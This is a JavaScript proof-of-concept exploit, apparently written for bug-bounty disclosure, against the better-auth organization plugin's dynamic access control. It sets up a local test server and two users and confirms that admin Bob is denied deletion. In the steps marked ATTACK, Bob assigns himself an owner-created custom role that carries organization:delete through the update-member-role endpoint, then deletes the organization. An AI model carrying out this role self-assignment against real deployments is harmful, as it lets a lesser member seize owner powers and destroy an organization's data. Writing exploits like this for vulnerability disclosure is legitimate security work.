import http from "node:http";
import fs from "node:fs";
import { DatabaseSync } from "node:sqlite";
import { betterAuth } from "better-auth";
import { getMigrations } from "./node_modules/better-auth/dist/db/get-migration.mjs";
import { organization, createAccessControl } from "better-auth/plugins";
import { createAuthClient } from "better-auth/client";
import { organizationClient } from "better-auth/client/plugins";

const PORT = 9879;
const BASE = `http://127.0.0.1:${PORT}`;
const SECRET = "r50-lab-secret-at-least-32-chars!!";
const statement = {
  organization: ["update", "delete"],
  member: ["create", "update", "delete"],
  invitation: ["create", "cancel"],
  team: ["create", "update", "delete"],
  ac: ["create", "read", "update", "delete"],
};
const ac = createAccessControl(statement);
const owner = ac.newRole({
  organization: ["update", "delete"],
  member: ["create", "update", "delete"],
  invitation: ["create", "cancel"],
  team: ["create", "update", "delete"],
  ac: ["create", "read", "update", "delete"],
});
const adminRole = ac.newRole({
  organization: ["update"],
  member: ["create", "update", "delete"],
  invitation: ["create", "cancel"],
  team: ["create", "update", "delete"],
  ac: ["create", "read", "update", "delete"],
});
const memberRole = ac.newRole({ organization: [], member: [], invitation: [], team: [], ac: [] });

const sqlite = new DatabaseSync(":memory:");
const plugins = [
  organization({
    ac,
    roles: { owner, admin: adminRole, member: memberRole },
    dynamicAccessControl: { enabled: true },
    async sendInvitationEmail() {},
  }),
];
const authOptions = {
  database: sqlite,
  emailAndPassword: { enabled: true },
  baseURL: BASE,
  secret: SECRET,
  trustedOrigins: [BASE],
  rateLimit: { enabled: false },
  plugins,
};
const { runMigrations } = await getMigrations(authOptions);
await runMigrations();
const auth = betterAuth(authOptions);
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url || "/", BASE);
  const headers = new Headers();
  for (const [k, v] of Object.entries(req.headers)) if (v) headers.set(k, Array.isArray(v) ? v.join(",") : v);
  const body = ["GET","HEAD"].includes(req.method||"") ? undefined : await new Promise((resolve,reject)=>{const c=[];req.on("data",d=>c.push(d));req.on("end",()=>resolve(Buffer.concat(c)));req.on("error",reject);});
  const response = await auth.handler(new Request(url,{method:req.method,headers,body}));
  res.writeHead(response.status, Object.fromEntries(response.headers.entries()));
  res.end(Buffer.from(await response.arrayBuffer()));
});
await new Promise((r)=>server.listen(PORT,"127.0.0.1",r));

function mergeCookie(jar, setCookies) {
  const map = Object.fromEntries(jar.cookie ? jar.cookie.split("; ").filter(Boolean).map((x)=>{const i=x.indexOf("=");return [x.slice(0,i),x.slice(i+1)];}) : []);
  for (const c of setCookies) { if(!c) continue; const part=c.split(";")[0]; const name=part.split("=")[0]; map[name]=part.slice(name.length+1); }
  jar.cookie = Object.entries(map).map(([k,v])=>`${k}=${v}`).join("; ");
}
function client(jar) {
  return createAuthClient({
    baseURL: BASE,
    plugins: [organizationClient({ ac, roles: { owner, admin: adminRole, member: memberRole } })],
    fetchOptions: { customFetchImpl: async (url, init={}) => {
      const headers = new Headers(init.headers||{});
      if (jar.cookie) headers.set("cookie", jar.cookie);
      headers.set("origin", BASE); headers.set("referer", BASE+"/");
      const res = await fetch(url,{...init,headers});
      mergeCookie(jar, typeof res.headers.getSetCookie==="function"?res.headers.getSetCookie():[]);
      return res;
    }},
  });
}
async function raw(method, path, { cookie="", body }={}) {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: { ...(body?{"content-type":"application/json"}:{}), ...(cookie?{cookie}:{}), origin:BASE, referer:BASE+"/" },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text(); let parsed; try{parsed=JSON.parse(text);}catch{parsed=text;}
  return { ok:res.ok, status:res.status, body:parsed, raw:text };
}
async function signup(email,name){
  const jar={cookie:""}; const c=client(jar);
  await c.signUp.email({email,password:"Password1!",name});
  await c.signIn.email({email,password:"Password1!"});
  return {jar,c,user:(await c.getSession()).data.user};
}

const evidence = [];
const alice = await signup("alice@lab.test","Alice");
const bob = await signup("bob@lab.test","Bob");
evidence.push({step:"users", alice:alice.user.id, bob:bob.user.id});

const org = await alice.c.organization.create({ name:"Acme", slug:"acme-c141" });
const orgId = org.data.id;
await alice.c.organization.setActive({ organizationId: orgId });
evidence.push({step:"createOrg", orgId, status:200});

// Control: Bob cannot delete before escalation
const inv = await alice.c.organization.inviteMember({ email:"bob@lab.test", role:"admin", organizationId: orgId });
await bob.c.organization.acceptInvitation({ invitationId: inv.data.id });
await bob.c.organization.setActive({ organizationId: orgId });
const full = await alice.c.organization.getFullOrganization({ query:{ organizationId: orgId }});
const bobMember = full.data.members.find(m=>m.userId===bob.user.id);
evidence.push({step:"bobJoinedAsAdmin", memberId: bobMember.id, role: bobMember.role});

const denyDelete = await raw("POST","/api/auth/organization/delete",{ cookie: bob.jar.cookie, body:{ organizationId: orgId }});
evidence.push({step:"control_bobCannotDelete", status: denyDelete.status, body: denyDelete.body});
console.log("CTRL bob delete denied?", denyDelete.status, denyDelete.body?.code||denyDelete.body?.message);

// Control: Bob cannot create role with organization:delete
const denyCreate = await raw("POST","/api/auth/organization/create-role",{
  cookie: bob.jar.cookie,
  body:{ role:"evil", permission:{ organization:["delete"], member:["create","update","delete"], invitation:["create","cancel"], team:["create","update","delete"], ac:["create","read","update","delete"] }, organizationId: orgId },
});
evidence.push({step:"control_bobCannotCreateDeleteRole", status: denyCreate.status, body: denyCreate.body});
console.log("CTRL bob create-role org:delete denied?", denyDelete.status, denyCreate.status);

// Alice (owner) creates a custom role with organization:delete (legitimate)
const createRole = await raw("POST","/api/auth/organization/create-role",{
  cookie: alice.jar.cookie,
  body:{ role:"billing-admin", permission:{ organization:["update","delete"], member:["create","update","delete"], invitation:["create","cancel"], team:["create","update","delete"], ac:["create","read","update","delete"] }, organizationId: orgId },
});
evidence.push({step:"ownerCreatesBillingAdminRole", status: createRole.status, body: createRole.body});
console.log("owner create-role", createRole.status);

// ATTACK: Bob assigns himself billing-admin (has org:delete) via updateMemberRole
const escalate = await raw("POST","/api/auth/organization/update-member-role",{
  cookie: bob.jar.cookie,
  body:{ memberId: bobMember.id, role:"billing-admin", organizationId: orgId },
});
evidence.push({step:"ATTACK_bobSelfAssignBillingAdmin", status: escalate.status, body: escalate.body});
console.log("ATTACK self-assign", escalate.status, escalate.body?.role);

// ATTACK: Bob now deletes the organization
const del = await raw("POST","/api/auth/organization/delete",{
  cookie: bob.jar.cookie,
  body:{ organizationId: orgId },
});
evidence.push({step:"ATTACK_bobDeletesOrg", status: del.status, body: del.body});
console.log("ATTACK delete org", del.status, del.body?.id||del.body);

// Confirm org gone
const gone = await raw("GET",`/api/auth/organization/get-full-organization?organizationId=${orgId}`,{ cookie: alice.jar.cookie });
evidence.push({step:"confirmOrgGoneForOwner", status: gone.status, body: gone.body});
console.log("owner getFull after delete", gone.status, gone.body?.code||gone.body?.message||gone.body);

fs.mkdirSync("/workspace/bounty-research/poc/r50-ba-dac-role-escalation",{recursive:true});
fs.writeFileSync("/workspace/bounty-research/poc/r50-ba-dac-role-escalation/e2e-evidence.json", JSON.stringify({ evidence, meta:{ betterAuth:"1.7.15", port:PORT, orgId }}, null, 2));
const confirmed = escalate.ok && del.ok && denyDelete.status>=400 && denyCreate.status>=400;
console.log("CONFIRMED", confirmed);
server.close();
process.exit(confirmed?0:1);
